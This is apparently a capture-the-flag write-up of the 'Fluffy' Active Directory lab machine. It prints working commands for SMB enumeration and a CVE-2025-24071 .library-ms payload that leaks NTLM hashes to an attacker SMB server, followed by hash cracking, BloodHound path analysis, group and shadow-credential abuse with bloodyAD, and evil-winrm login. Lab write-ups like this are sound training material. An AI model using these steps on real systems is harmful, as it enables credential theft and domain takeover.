We first start by adding the box hostname to the hosts file.

```bash
echo 10.100.100.100 fluffy.htb | sudo tee -a /etc/hosts
```

Once that's done, we do a TCP scan of the box using `nmap` to find out what kind of services are running on it.

```bash
nmap -sT --top-ports 1000 -A -T4 -v -oN custom_scan_fluffy.htb_20250911_150946.txt fluffy.htb
```

The scan reveal that the target OS is Windows Server 2019.

```bash
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
```

It also reveal 10 services running on the box.

```bash
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-09-12 03:10:29Z)
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
```

Finally, we notice a clock skew between our host and the target machine.

```bash
Host script results:
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time:
|   date: 2025-09-12T03:11:15
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
```

Before pushing our recon further, we first need to fix the clock skew.
We can do this by getting the DC time using `ldapsearch` with our starting account, `j.fleischman`.

```bash
ldapsearch -H ldap://10.100.100.100 -D "j.fleischman@fluffy.htb" -w "[REDACTED]" -b "" -s base currentTime
```

Once we have the DC time, we can set the system time using the `date` command.

```bash
sudo date -s "2025-09-12 03:46:41 UTC"
```

Now that the clock skew is fixed, we can explore the services we found earlier with `nmap`.

Since port `445` is opened and used by `smb`, this mean there is probably some network shares to check out.
We can list them using `smbclient` with our starting account, `j.fleischman`.

```bash
smbclient -U "j.fleischman@fluffy.htb%[REDACTED]" -L "\\10.100.100.100"
```

We find the expected default shares. But, one share stands out from the rest: `IT`.

```bash
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
IT              Disk
NETLOGON        Disk      Logon server share
SYSVOL          Disk      Logon server share
```

We can use `smbclient` again to connect to explore it further.

```bash
smbclient -U "j.fleischman@fluffy.htb%[REDACTED]" "\\10.100.100.100\IT"
```

Once we are connected, we can list the content of the share using `ls`.
We can see 2 archives with corresponding directories, as if they were extracted.
There is also a PDF file that looks more interesting.

```bash
smb: \> ls
  .                                   D        0  Mon May 19 09:27:02 2025

  Upgrade_Notice.pdf                  A   169963  Sat May 17 09:31:07 2025
```

We can download the files using the `get` command.

```bash
smb: \> get Upgrade_Notice.pdf
getting file \Upgrade_Notice.pdf of size 169963 as Upgrade_Notice.pdf (948.5 KiloBytes/sec) (average 948.5 KiloBytes/sec)
```

If we open the downloaded file, we can see that it contain an Upgrade Process from the Infrastructure Department to patch high-impact vulnerabilities, notably `CVE-2025-24996` and `CVE-2025-24071`.

After searching for a bit, we find this blog post by `0x6rss` explaining how we can abuse `NTLM Hash Leak via RAR/ZIP Extraction and .library-ms File`

```bash
https://cti.monster/blog/2025/03/18/CVE-2025-24071.html
```

We also find a `git` repository related to the blog post with a POC, were we find the an example `.library-ms` file payload that we can use.

```bash
https://github.com/0x6rss/CVE-2025-24071_PoC/tree/main
```

With the payload in hand, all that is left to do is find a way to trigger the exploit.
We remember the 2 archives in the `IT` share with corresponding directories, as if they were extracted.
This means that if we upload an archive to the `IT` share with the malicious `.library-ms`, it might get extracted by a user, which would trigger the payload.

To do this, let's start off by creating a new `.library-ms` file containing our payload.
Don't forget to replace the IP !

```bash
echo '<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>\\10.10.10.10\shared</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>' > exploit.library-ms
```

Once that's done, we need to zip the malicious `.library-ms`.

```bash
zip exploit.zip exploit.library-ms
```

Before uploading our payload, we need to start a `smb` server with `impacket` that will capture the NTLM Hash.

```bash
sudo impacket-smbserver -smb2support -debug shared /tmp
```

All that is left to do now is upload the archive containing the payload with `smbclient`.

```bash
smb: \> put exploit.zip
putting file exploit.zip as \exploit.zip (5.5 kb/s) (average 5.5 kb/s)
```

We can see the exploit.zip archive being extracted into the exploit directory.

```bash
smb: \> ls
  .                                   D        0  Thu Sep 11 23:43:11 2025

```

We can see an incoming connection to our `smb` server from the user `p.agila`.
The captured NTLM Hash is also displayed.

```bash
09/11/2025 11:43:14 PM: INFO: Incoming connection (10.100.100.100,50657)
09/11/2025 11:43:14 PM: INFO: AUTHENTICATE_MESSAGE (FLUFFY\p.agila,DC01)
09/11/2025 11:43:14 PM: INFO: User DC01\p.agila authenticated successfully
09/11/2025 11:43:14 PM: INFO: p.agila::FLUFFY:[REDACTED-NTLMV2-HASH]
```

Now that we have the Hash, we want to make sure it's valid using `namethathash` and confirm the Hash type.

```bash
nth -t "[REDACTED-NTLMV2-HASH]"
```

```bash
Most Likely
NetNTLMv2, HC: 5600 JtR: netntlmv2
```

Once we confirmed the Hash type to be `NetNTLMv2`, we can try to crack it using `hashcat` with `rockyou.txt`.

```bash
hashcat -m 5600 -a 0 hash.txt /home/bhugo97/pentest-toolbox/wordlists/rockyou.txt -w 4
```

Bingo ! The password is cracked.

```bash
P.AGILA::FLUFFY:[REDACTED-NTLMV2-HASH]:[REDACTED]
```

Now that we have the `p.agila` user credentials, we should check if he has access to anything interesting.
To do this, we can use `bloodhound`.

But, before using `bloodhound` to visualize our high value targets, we first need to collect data using `bloodhound-python`.

```bash
bloodhound-python -d fluffy.htb -u p.agila -p [REDACTED] -c All -ns 10.100.100.100
```

Once the data is collected, we can start `bloodhound` and upload the data we found with `bloodhound-python`.

```bash
bloodhound
```

Once the data is uploaded, we can check the `Reachable High Value Targets` for the user `p.agila`.

![BloodHound Screenshot]({{ site.baseurl }}/assets/images/fluffy/bloodhound-path.png)

We find out that:

- The user `p.agila` is a member of the group `Service Account Managers`.
- The `Service Account Managers` group has a `GenericAll` permission on the `Service Accounts` group.
- The `Service Accounts` group has a `GenericWrite` permission on the `WINRM_SVC` account.
- The `WINRM_SVC` account has a `CanPSRemote` permission on the domain controller.

This means we have a clear path to exploit.

The first step is adding the user `p.agila` to the `Service Accounts` group using `bloodyAD`.

```bash
./bloodyAD.py --host 10.100.100.100 -d fluffy.htb -u p.agila -p [REDACTED] add groupMember "Service Accounts" p.agila
```

Now that we have a `GenericWrite` permission, the next step is to add shadow credentials to the `WINRM_SVC` service account.

```bash
./bloodyAD.py --host 10.100.100.100 -d fluffy.htb -u p.agila -p [REDACTED] add shadowCredentials winrm_svc
```

This gives us the NT Hash for the `WINRM_SVC` service account.

```bash
[+] KeyCredential generated with following sha256 of RSA key: [REDACTED-SHA256]
[+] TGT stored in ccache file winrm_svc_ta.ccache

NT: [REDACTED-NT-HASH]
```

Once we have the NT Hash, we can connect with `evil-winrm` using the `WINRM_SVC` service account.

```bash
evil-winrm -i 10.100.100.100 -u winrm_svc -H [REDACTED-NT-HASH]
```

After we connect, we can find the `user.txt` flag in the `Desktop` directory.

```bash
*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> ls


    Directory: C:\Users\winrm_svc\Desktop


Mode                LastWriteTime         Length Name

*Evil-WinRM* PS C:\Users\winrm_svc\Desktop> download user.txt

Info: Downloading C:\Users\winrm_svc\Desktop\user.txt to user.txt

```

To be continued !
